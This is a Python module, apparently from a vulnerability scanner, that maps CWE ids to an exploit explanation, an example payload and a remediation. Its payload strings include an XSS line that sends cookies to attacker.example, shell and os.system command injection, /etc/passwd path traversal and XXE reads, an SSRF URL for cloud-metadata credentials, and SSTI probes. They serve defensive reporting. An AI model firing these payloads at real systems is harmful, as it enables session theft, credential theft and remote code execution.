"""CWE -> (exploit, example payload, patch) enrichment.

Deterministic, offline lookup table. It lets any finding (built-in or Semgrep)
present the same four answers the operator needs: what the bug is, how it is
exploited, a concrete example payload, and how to patch it. Nothing here runs or
sends anything; the payloads are short illustrative strings for an authorized
lab, not live attacks.
"""
from __future__ import annotations

import re

# Keyed by the numeric CWE id as a string.
CWE_ENRICH: dict[str, dict[str, str]] = {
    "89": {  # SQL Injection
        "exploit": "Attacker-controlled input changes the structure of the SQL query, so they can read, modify or delete data outside their rows, bypass authentication or dump the database.",
        "payload": "' OR '1'='1' -- ",
        "patch": "Use parameterized queries / prepared statements and bind every value. Never build SQL by string concatenation or f-strings. Apply least-privilege DB accounts.",
    },
    "78": {  # OS Command Injection
        "exploit": "Shell metacharacters in the input let the attacker append their own commands to the one the program runs, giving remote code execution.",
        "payload": "; id #    (or: $(id) , `id` , | id)",
        "patch": "Do not invoke a shell. Pass an argument list (shell=False / execve-style) and validate inputs against a strict allowlist. Avoid os.system and shell=True.",
    },
    "79": {  # XSS
        "exploit": "Unescaped input is reflected or stored into a page, so attacker script runs in a victim's browser and can steal the session cookie or act as the victim.",
        "payload": "<script>fetch('//attacker.example/'+document.cookie)</script>",
        "patch": "Use context-aware output encoding (HTML / attribute / JS / URL). Rely on the framework's auto-escaping, avoid innerHTML, and set a strict Content-Security-Policy.",
    },
    "94": {  # Code Injection
        "exploit": "Input reaches a dynamic code evaluator, so the attacker supplies code that the server executes with the app's privileges.",
        "payload": "__import__('os').system('id')",
        "patch": "Never evaluate untrusted input. Replace eval/exec with a safe parser (ast.literal_eval, JSON) or an explicit allowlisted dispatch table.",
    },
    "95": {  # eval injection (treated like code injection)
        "exploit": "Input reaches eval()/exec()/Function(), so the attacker runs arbitrary code in the process.",
        "payload": "__import__('os').system('id')",
        "patch": "Remove the dynamic evaluation. Use ast.literal_eval for data, JSON.parse for JSON, or a fixed mapping of allowed operations.",
    },
    "200": {  # Information exposure (e.g. secret shipped to the client)
        "exploit": "Sensitive data (a signing secret, key or token) is placed where the client can read it, so any visitor recovers it from the HTML, props or bundle and reuses it, e.g. to forge authentication.",
        "payload": "view-source / inspect __NEXT_DATA__ for the leaked secret",
        "patch": "Keep secrets server-side only. Never return them from getServerSideProps/props, expose them via NEXT_PUBLIC_* or embed them in client code. Rotate anything already shipped.",
    },
    "321": {  # Hard-coded cryptographic key
        "exploit": "The signing/encryption key is embedded in source or the client bundle, so anyone who reads it can forge valid signatures or tokens (e.g. mint an admin session) or decrypt protected data.",
        "payload": "// recover the literal key, then: sign({role:'admin'}, KEY)",
        "patch": "Load keys from the environment or a secret manager, never from source. Rotate any key that has shipped, and keep it server-side only (never in NEXT_PUBLIC_* or page props).",
    },
    "208": {  # Observable timing discrepancy (non-constant-time compare)
        "exploit": "Comparing a secret/MAC with ==/=== returns as soon as a byte differs, leaking how many leading bytes matched; an attacker can recover the value byte-by-byte by measuring response time.",
        "payload": "for b in range(256): measure_time(sig_with_guessed_byte(b))",
        "patch": "Compare with a constant-time function (crypto.timingSafeEqual / hmac.compare_digest) on equal-length buffers; reject on any length mismatch first.",
    },
    "285": {  # Improper authorization (trusting a client role claim)
        "exploit": "The role or privilege is taken from client-controlled input, so an attacker simply sets role=admin (in the body, query or a self-minted token) to gain elevated access.",
        "payload": 'POST /api/token  {"username":"x","role":"admin"}',
        "patch": "Derive authorization from a server-verified session/identity, never from request data. Mint tokens server-side and check permissions against trusted state on every protected action.",
    },
    "1286": {  # Improper validation of syntactic correctness (dup-param type confusion)
        "exploit": "A repeated query key (?x=a&x=b) is parsed into an array, so code written for a string receives an array; this defeats string-only validation (e.g. a path check) and enables traversal or logic bypass.",
        "payload": "?file=ok.txt&file=../../flag",
        "patch": "Reject non-string parameters (typeof x !== 'string') or normalise explicitly, and run validation on the same representation the sink consumes.",
    },
    "22": {  # Path Traversal
        "exploit": "Directory traversal sequences in a filename let the attacker step outside the intended folder and read or write arbitrary files.",
        "payload": "../../../../etc/passwd",
        "patch": "Resolve the path (realpath) and confirm it stays inside an allowlisted base directory before use. Reject names containing '..' or absolute paths.",
    },
    "502": {  # Insecure Deserialization
        "exploit": "The attacker crafts a serialized object whose constructor or __reduce__ runs code the moment it is deserialized, giving remote code execution.",
        "payload": "a pickle whose __reduce__ returns (os.system, ('id',))",
        "patch": "Never deserialize untrusted data with pickle/marshal or yaml.load. Use a data-only format (JSON) with a strict schema, or yaml.safe_load.",
    },
    "918": {  # SSRF
        "exploit": "The server fetches a URL the attacker controls, so they reach internal services, cloud metadata or the loopback interface from inside the network.",
        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "patch": "Allowlist the destinations the server may contact. Block private, loopback and link-local ranges after resolving the host, and disable unneeded redirect following.",
    },
    "611": {  # XXE
        "exploit": "A crafted XML external entity makes the parser read local files or make network requests on the attacker's behalf.",
        "payload": "<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>",
        "patch": "Disable DTDs and external entity resolution in the XML parser (for example defusedxml, or features that forbid DOCTYPE).",
    },
    "327": {  # Weak crypto
        "exploit": "A broken or weak algorithm lets the attacker forge, decrypt or collide protected values offline.",
        "payload": "offline brute force or a known collision against the weak primitive",
        "patch": "Use vetted modern primitives: AES-GCM for encryption, SHA-256 or better for integrity, and a KDF (argon2/bcrypt/scrypt) for passwords.",
    },
    "328": {  # Weak hash
        "exploit": "MD5/SHA1 are fast and collision-prone, so hashes can be reversed with rainbow tables or collided.",
        "payload": "rainbow-table lookup of the unsalted hash",
        "patch": "For passwords use argon2id or bcrypt with a per-user salt. For integrity use SHA-256 or SHA-3. Never use MD5 or SHA1 for security.",
    },
    "798": {  # Hardcoded credentials
        "exploit": "A secret committed in source or history is readable by anyone with the code, so they authenticate as the app.",
        "payload": "read the committed key from git history and reuse it",
        "patch": "Move secrets to environment variables or a secret manager, rotate the exposed value immediately, and keep secrets out of version control.",
    },
    "338": {  # Weak PRNG
        "exploit": "A non-cryptographic random generator is predictable, so tokens, session ids or reset codes can be guessed.",
        "payload": "recover the PRNG seed and predict the next token",
        "patch": "Use a cryptographically secure source: secrets / os.urandom in Python, crypto.randomBytes in Node, SecureRandom in Java.",
    },
    "601": {  # Open redirect
        "exploit": "A user-controlled redirect target sends victims to an attacker site, aiding phishing and OAuth token theft.",
        "payload": "//attacker.example/login",
        "patch": "Allowlist redirect targets or only allow relative paths. Never redirect to a raw user-supplied URL.",
    },
    "1336": {  # SSTI
        "exploit": "Input rendered as a template is evaluated server-side, which usually escalates to reading config and then remote code execution.",
        "payload": "{{7*7}} to confirm, then {{''.__class__.__mro__[1].__subclasses__()}}",
        "patch": "Never render user input as a template. Pass it as data to a static template and use a sandboxed engine with auto-escaping.",
    },
    "90": {  # LDAP injection
        "exploit": "Unescaped input in an LDAP filter lets the attacker alter the query and bypass authentication or enumerate the directory.",
        "payload": "*)(uid=*))(|(uid=*",
        "patch": "Escape LDAP special characters or use a parameterized directory API. Validate inputs against an allowlist.",
    },
    "643": {  # XPath injection
        "exploit": "Unescaped input in an XPath expression lets the attacker change the query and read nodes they should not reach.",
        "payload": "' or '1'='1",
        "patch": "Use parameterized XPath (variable binding) and validate input. Do not concatenate input into the expression.",
    },
    "1321": {  # Prototype pollution
        "exploit": "Attacker keys like __proto__ reach a recursive merge, polluting Object.prototype and changing app behaviour or enabling RCE.",
        "payload": "{\"__proto__\": {\"isAdmin\": true}}",
        "patch": "Reject __proto__/constructor/prototype keys, use Map or Object.create(null), and freeze prototypes.",
    },
    "20": {  # Improper input validation (generic)
        "exploit": "Input is used without validation, so malformed or hostile values reach sensitive logic.",
        "payload": "a value outside the expected type, length or character set",
        "patch": "Validate every input against a strict allowlist of type, length, format and range at the trust boundary, then reject anything else.",
    },
}

# Map common aliases to a canonical entry above.
_ALIAS = {"77": "78", "89": "89", "96": "94", "915": "502", "1333": "20"}

# Plain-English name per CWE, so a finding says "Path Traversal" not just "CWE-22".
CWE_NAMES: dict[str, str] = {
    "20": "Improper Input Validation", "22": "Path Traversal",
    "73": "External Control of File Path", "77": "Command Injection",
    "78": "OS Command Injection", "79": "Cross-Site Scripting (XSS)",
    "89": "SQL Injection", "90": "LDAP Injection", "94": "Code Injection",
    "95": "Code Injection (eval)", "96": "Server-Side Template Injection (SSTI)",
    "200": "Information Exposure", "287": "Improper Authentication",
    "295": "Improper Certificate Validation", "312": "Cleartext Storage of Sensitive Data",
    "319": "Cleartext Transmission", "326": "Inadequate Encryption Strength",
    "327": "Use of a Broken/Weak Crypto Algorithm", "328": "Use of a Weak Hash",
    "338": "Weak Randomness (predictable)", "347": "Improper Verification of Signature",
    "352": "Cross-Site Request Forgery (CSRF)", "400": "Uncontrolled Resource Consumption (DoS)",
    "434": "Unrestricted File Upload", "476": "NULL Pointer Dereference",
    "502": "Insecure Deserialization", "522": "Insufficiently Protected Credentials",
    "601": "Open Redirect", "611": "XML External Entity (XXE)", "643": "XPath Injection",
    "697": "Incorrect Comparison (type juggling)", "798": "Hardcoded Credentials",
    "862": "Missing Authorization", "863": "Incorrect Authorization",
    "918": "Server-Side Request Forgery (SSRF)", "1004": "Sensitive Cookie without HttpOnly",
    "1321": "Prototype Pollution", "1333": "Inefficient Regex (ReDoS)",
    "1336": "Server-Side Template Injection (SSTI)",
    "208": "Observable Timing Discrepancy", "285": "Improper Authorization",
    "321": "Hard-coded Cryptographic Key",
    "1286": "Improper Input Validation (type confusion)",
}

_CWE_NUM = re.compile(r"CWE[-_ ]?(\d+)", re.I)
_CVE_RE = re.compile(r"CVE-\d{4}-\d{3,7}", re.I)


def cwe_name(cwe: str | None) -> str | None:
    num = cwe_number(cwe)
    return CWE_NAMES.get(_ALIAS.get(num, num)) if num else None


def cwe_fix_url(cwe: str | None) -> str | None:
    """A reliable 'how to fix / learn more' link: the CWE page has mitigations."""
    num = cwe_number(cwe)
    return f"https://cwe.mitre.org/data/definitions/{num}.html" if num else None


def find_cves(*texts: str) -> list[dict]:
    """Extract CVE ids from text and link each to its NVD detail page."""
    seen: dict[str, dict] = {}
    for t in texts:
        for m in _CVE_RE.findall(t or ""):
            cid = m.upper()
            seen.setdefault(cid, {"id": cid, "url": f"https://nvd.nist.gov/vuln/detail/{cid}"})
    return list(seen.values())


def cwe_number(cwe: str | None) -> str | None:
    if not cwe:
        return None
    m = _CWE_NUM.search(cwe)
    return m.group(1) if m else None


def enrich_for_cwe(cwe: str | None) -> dict[str, str] | None:
    """Return {exploit, payload, patch} for a CWE string, or None if unknown."""
    num = cwe_number(cwe)
    if not num:
        return None
    num = _ALIAS.get(num, num)
    return CWE_ENRICH.get(num)
